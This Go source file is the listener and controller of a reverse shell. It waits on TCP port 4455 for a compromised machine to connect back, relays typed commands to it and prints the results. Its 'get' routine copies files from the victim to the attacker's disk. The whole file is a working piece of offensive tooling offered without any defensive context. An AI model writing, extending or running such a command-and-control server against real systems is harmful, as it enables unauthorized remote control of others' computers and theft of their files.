package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 1024

func main() {
	var buff [2048]byte //stores output from reverse shell

	fmt.Println("Server started")
	listner, _ := net.Listen("tcp", ":4455")
	conn, _ := listner.Accept()
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(">>")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "kill") == 0 {
			conn.Write([]byte(command))
			conn.Close()
			os.Exit(1)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(conn, command)

		} else {
			conn.Write([]byte(command))
			n, _ := conn.Read(buff[0:])
			fmt.Println(string(buff[0:n]))
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("file size ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("file name ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		panic(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("Received file completely!")
	return
}

func checkerror(err error) {
	if err != nil {
		log.Fatal(err)
	}

}
